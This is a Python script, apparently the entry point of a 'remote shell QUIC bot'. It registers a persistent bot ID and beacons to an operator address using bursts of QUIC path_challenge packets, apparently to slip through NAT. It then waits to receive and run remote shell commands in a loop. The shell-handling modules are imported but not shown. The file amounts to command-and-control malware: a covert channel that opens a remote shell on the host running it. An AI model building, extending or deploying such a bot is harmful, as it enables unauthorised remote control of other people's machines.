#!/usr/bin/env python3

import os
import json
import uuid
import asyncio
import argparse


from lib.shell_receiver import ShellReceiver
from lib.beacon import transmit_beacon


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="remote shell QUIC bot")

    parser.add_argument("-name",
                        type=str,
                        help="the name given for the bot (mandatory)")

    parser.add_argument("-addr",
                        type=str,
                        help="the address to connect to (mandatory)")

    parser.add_argument("-port",
                        type=int,
                        default=1337,
                        help="the port used for the connection")

    parser.add_argument("-burst",
                        type=int,
                        default=1,
                        help="number of path_challenges to send at once")

    parser.add_argument("-burst_timeout",
                        type=int,
                        default=5,
                        help="timeout between each path_challenge burst")

    parser.add_argument("-timeout",
                        type=int,
                        default=10,
                        help="timeout for our bot to listen to new shell commands")

    parser.add_argument("-forever",
                        type=bool,
                        default=False,
                        help="exit after one nat traversal trial")

    args = parser.parse_args()
    if args.name is None or args.addr is None:
        parser.print_help()
        raise argparse.ArgumentError(
            argument=None, message="name is None or addr is None")
    return args


class ConnectionInfo:
    indent = 2

    def __init__(self, **kwargs):
        self.id: str = self.__get_json_config(**kwargs)["id"]
        self.name: str = kwargs["name"]
        self.addr: str = kwargs["addr"]
        self.port: int = kwargs["port"]

    def __get_json_config(self, **kwargs):
        if not os.path.isfile("connection_data/{}.json".format(kwargs["name"])):
            return self.__generate_json_config(**kwargs)

        with open("connection_data/{}.json".format(kwargs["name"]), mode="r") as json_file:
            config = json.load(json_file)
            return config

    @classmethod
    def __generate_json_config(cls, **kwargs) -> dict:
        config = {"name": kwargs["name"],
                  "id": ConnectionInfo.__generate_random_id()
                  }

        with open("connection_data/{}.json".format(kwargs["name"]), mode="w") as json_file:
            json.dump(config, json_file, indent=cls.indent)
            return config

    @staticmethod
    def __generate_random_id() -> str:
        unique_id = uuid.uuid4()
        return unique_id.hex[:8]


async def main_loop():
    try:
        args = parse_args()
    except argparse.ArgumentError as e:
        print(e.message)
        return

    connection_info = ConnectionInfo(**vars(args))

    # change to ipv4 "0.0.0.0". ipv4 doesn't work on localhost
    receiver = ShellReceiver("::", args.port, args.timeout)

    while True:
        await transmit_beacon((args.addr, args.port), connection_info.id.encode(), args.burst, args.burst_timeout)
        print("finished beacon")
        await receiver.listen()
        print("finished receiver")

        # TODO: temporary fix for
        # OSError: [WinError 10048] Only one usage of each socket address (protocol/network address/port) is normally permitted
        if not args.forever:
            break


if __name__ == "__main__":
    asyncio.run(main_loop())
